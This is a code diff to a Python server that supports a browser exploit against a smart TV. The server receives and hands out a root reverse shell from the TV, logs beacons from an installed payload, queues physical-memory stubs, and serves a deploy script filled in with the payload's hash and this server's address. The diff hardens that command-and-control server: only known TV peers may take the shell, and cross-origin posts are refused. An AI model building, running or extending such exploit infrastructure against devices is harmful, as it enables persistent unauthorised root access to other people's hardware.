@@ -11,8 +11,10 @@
 The TV shell (from the browser exploit) runs as uid=5001(owner) and persists as
 long as this server keeps the socket open.
 """
+import hashlib
 import os
 import queue
+import re
 import socket
 import threading
 import time
@@ -39,7 +41,8 @@ HTTP_PORT = int(os.environ.get("HTTP_PORT", "80"))
 HTTP_BIND = os.environ.get("HTTP_BIND", "0.0.0.0")
 
 TYPES = {".html": "text/html", ".js": "application/javascript",
-         ".json": "application/json", ".bin": "application/octet-stream"}
+         ".json": "application/json", ".bin": "application/octet-stream",
+         ".sh": "text/plain; charset=utf-8", ".txt": "text/plain; charset=utf-8"}
 
 # Never serve the server's own source or its logs on the LAN.
 DENY_SUFFIX = {".py", ".log", ".out", ".err", ".db", ".pem", ".key", ".journal"}
@@ -47,6 +50,21 @@ DENY_NAMES = {"shell.log", "server.out", "server.err"}
 LOG_MAX = 8 * 1024 * 1024
 MAX_BODY = 1024 * 1024       # POST /save: enough for a page dump, not a disk fill
 OUTPUT_MAX = 1024 * 1024     # rolling TV output kept for shell clients
+BEACON_MAX = 4096            # one DSHROOT line; nothing legitimate is longer
+RPC_QUEUE_MAX = 8            # stale page loads must not pile up as open sockets
+
+# Request line: METHOD SP target SP HTTP/x.y.  Anything that matches is HTTP and
+# is answered as such; a reverse-shell connection is a raw stream that never
+# starts with a request line, so it can no longer capture the shell slot.
+REQ_LINE = re.compile(r"^([A-Z]{3,8})[ \t]+(\S+)[ \t]+HTTP/\d(?:\.\d)?$")
+HTTP_METHODS = {"GET", "HEAD", "POST", "OPTIONS"}
+IPV4 = re.compile(r"^(?:\d{1,3}\.){3}\d{1,3}$")
+
+# Peers that have announced themselves as the TV (PGDB hello or a DSHROOT
+# beacon).  The interactive reverse shell is only accepted from these: on a LAN
+# port 80 anybody can open a TCP connection, and the old fallback gave the first
+# stranger the operator's root-shell slot (found by review, 2026-10-26).
+TV_PEERS = set()
 
 state_lock = threading.Lock()
 tv_sock = None
@@ -131,6 +149,46 @@ def _append_output(chunk: bytes):
             output_dropped += excess
 
 
+def _header(head: bytes, name: str) -> str:
+    """Case-insensitive header lookup over the raw request head."""
+    want = name.encode().lower() + b":"
+    for line in head.split(b"\r\n")[1:]:
+        if line.lower().startswith(want):
+            return line.split(b":", 1)[1].strip().decode("latin-1")
+    return ""
+
+
+def _is_ipv4(host: str) -> bool:
+    if not IPV4.match(host or ""):
+        return False
+    return all(0 <= int(part) <= 255 for part in host.split("."))
+
+
+def deploy_script(host_header: str):
+    """Render deploy.sh for the address the TV used to fetch it.
+
+    The script ships as a template (`H=@HOST@`, `WANT=@WANT@`, `SIZE_WANT=@SIZE@`)
+    and is completed at request time: the payload hash comes from the artifact
+    actually served, so a stale copy can no longer gate the wrong build, and
+    `H` is exactly the address the TV reached us on.  A non-IPv4 Host is refused
+    instead of guessed: the allowlist compares peer IPs, so a hostname would lock
+    the channel out (review finding H3, 2026-10-26).
+    """
+    host = (host_header or "").split(":")[0].strip()
+    if not _is_ipv4(host):
+        return None
+    try:
+        data = (ROOT / "payload.dll").read_bytes()
+        text = (ROOT / "deploy.sh").read_text(encoding="utf-8", errors="replace")
+    except OSError as exc:
+        print(f"[http] deploy template unavailable: {exc}", flush=True)
+        return None
+    text = (text.replace("@HOST@", f"http://{host}")
+                .replace("@WANT@", hashlib.md5(data).hexdigest())
+                .replace("@SIZE@", str(len(data))))
+    return text.encode()
+
+
 def _is_textish(chunk: bytes) -> bool:
     """True for shell/console output; False for 4 KB binary physmap pages."""
     if not chunk:
@@ -189,10 +247,28 @@ def serve_http(conn, req):
         parts = line.split()
         method = parts[0] if parts else "GET"
         path = (parts[1] if len(parts) > 1 else "/").split("?")[0]
+        if len(parts) > 2 and parts[2].upper().startswith("HTTP/"):
+            if method not in HTTP_METHODS:
+                # Known HTTP method we do not serve: answer as HTTP.  It must not
+                # fall through to the reverse-shell handler.
+                conn.sendall(b"HTTP/1.1 405 Method Not Allowed\r\n"
+                             b"Allow: GET, HEAD, POST, OPTIONS\r\n"
+                             b"Content-Length: 0\r\nConnection: close\r\n\r\n")
+                print(f"[http] 405 {method} {path}", flush=True)
+                return
 
         # --- log sink: pages POST their textarea here ---
         if method == "POST" and path == "/save":
-            from datetime import datetime
+            # A cross-origin <form>/fetch can POST here without reading the reply.
+            # Browsers attach Origin to those; same-origin page sends its own host.
+            origin = _header(head, "origin")
+            if origin:
+                host = _header(head, "host")
+                if origin.rsplit("/", 1)[-1] != host:
+                    conn.sendall(b"HTTP/1.1 403 Forbidden\r\n"
+                                 b"Content-Length: 0\r\nConnection: close\r\n\r\n")
+                    print(f"[save] refused cross-origin {origin!r}", flush=True)
+                    return
             stamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
             out = LOGS_TV / f"tv_output_{stamp}.txt"
             out.write_bytes(body)
@@ -200,6 +276,25 @@ def serve_http(conn, req):
             hdr = b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok"
             conn.sendall(hdr)
             print(f"[save] {out.name} {len(body)}B", flush=True)
+            return
+
+        # --- deploy script: rendered per request, never a stale generated copy ---
+        if path in ("/deploy.sh", "/deploy_local.sh"):
+            body_out = deploy_script(_header(head, "host"))
+            if body_out is None:
+                msg = (b"serve this page by IPv4 address (the deploy script needs "
+                       b"the PC address the TV used, and the allowlist compares IPs)\n")
+                conn.sendall(b"HTTP/1.1 409 Conflict\r\nContent-Type: text/plain\r\n"
+                             + f"Content-Length: {len(msg)}\r\n".encode()
+                             + b"Connection: close\r\n\r\n" + msg)
+                print("[http] deploy.sh refused: Host is not an IPv4 address",
+                      flush=True)
+                return
+            hdr = (f"HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8\r\n"
+                   f"Content-Length: {len(body_out)}\r\nCache-Control: no-store\r\n"
+                   f"Connection: close\r\n\r\n").encode()
+            conn.sendall(hdr + body_out)
+            print(f"[http] {path} {len(body_out)}B (rendered for host)", flush=True)
             return
 
         if path == "/":
@@ -220,7 +315,7 @@ def serve_http(conn, req):
             conn.sendall(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n")
             return
         data = target.read_bytes()
-        ctype = TYPES.get(target.suffix, "application/octet-stream")
+        ctype = TYPES.get(target.suffix.lower(), "application/octet-stream")
         hdr = (f"HTTP/1.1 200 OK\r\nContent-Type: {ctype}\r\n"
                f"Content-Length: {len(data)}\r\nCache-Control: no-store\r\n"
                f"Connection: close\r\n\r\n").encode()
@@ -498,6 +593,33 @@ def rpc_server():
         threading.Thread(target=rpc_gateway_client, args=(c,), daemon=True).start()
 
 
+def _tcp_peer(conn):
+    try:
+        return conn.getpeername()[0]
+    except OSError:
+        return ""
+
+
+def _queue_stub(conn):
+    """Hand a TV physmap stub to the gateway, dropping the oldest if full.
+
+    Every page load opens a new stub connection; before this cap a reload loop
+    (or a few tabs) left an unbounded queue of dead sockets, and the gateway
+    could pair with one of them.
+    """
+    while rpc_queue.qsize() >= RPC_QUEUE_MAX:
+        try:
+            old = rpc_queue.get_nowait()
+        except queue.Empty:
+            break
+        try:
+            old.close()
+        except OSError:
+            pass
+        print("[rpc] dropped the oldest queued stub (queue full)", flush=True)
+    rpc_queue.put(conn)
+
+
 def http_server():
     srv = socket.socket()
     srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -509,18 +631,27 @@ def http_server():
         try:
             conn.settimeout(1.5)
             try:
-                first = conn.recv(16, socket.MSG_PEEK)
+                first = conn.recv(64, socket.MSG_PEEK)
             except socket.timeout:
                 first = b""
             conn.settimeout(None)
+            peer = addr[0] if addr else ""
             if first[:4] == b"PGDB":
                 print("[rpc] TV physmap stub connected", flush=True)
-                rpc_queue.put(conn)
+                with state_lock:
+                    TV_PEERS.add(peer)
+                _queue_stub(conn)
                 continue
             if first[:7] == b"DSHROOT":
                 # app payload beacon: log it, but never let it take the shell slot
                 try:
-                    data = conn.recv(8192)
+                    data = conn.recv(BEACON_MAX + 1)
+                    with state_lock:
+                        TV_PEERS.add(peer)
+                    if len(data) > BEACON_MAX:
+                        print(f"[beacon] oversized line from {peer} "
+                              f"({len(data)}B) truncated", flush=True)
+                        data = data[:BEACON_MAX]
                     print(f"[beacon] {data[:300]!r}", flush=True)
                     with BEACON_LOG.open("a", encoding="utf-8", errors="replace") as fh:
                         fh.write(f"{datetime.now().isoformat(timespec='seconds')} "
@@ -529,7 +660,10 @@ def http_server():
                     pass
                 conn.close()
                 continue
-            if first[:4] in (b"GET ", b"POST", b"HEAD", b"OPTI"):
+            token = first.split(b" ", 1)[0]
+            looks_http = (b" " in first and token.isalpha()
+                          and token.isupper() and 3 <= len(token) <= 8)
+            if looks_http:
                 req = b""
                 try:
                     req = conn.recv(8192)
@@ -539,7 +673,18 @@ def http_server():
                 serve_http(conn, req)
                 conn.close()
             else:
-                handle_shell(conn)   # keep open
+                # Raw peer: this is the reverse shell, which only the TV may own.
+                # Without this check any LAN host that opens a TCP connection and
+                # stays silent took the operator's root-shell slot (review
+                # 2026-10-26; proven with a `PATCH /` request before the fix).
+                with state_lock:
+                    known = peer in TV_PEERS
+                if not known:
+                    print(f"[shell] refused {peer}: not a TV peer "
+                          f"(send PGDB or a DSHROOT beacon first)", flush=True)
+                    conn.close()
+                else:
+                    handle_shell(conn)   # keep open
         except Exception as exc:
             print(f"[http] {exc}", flush=True)
 
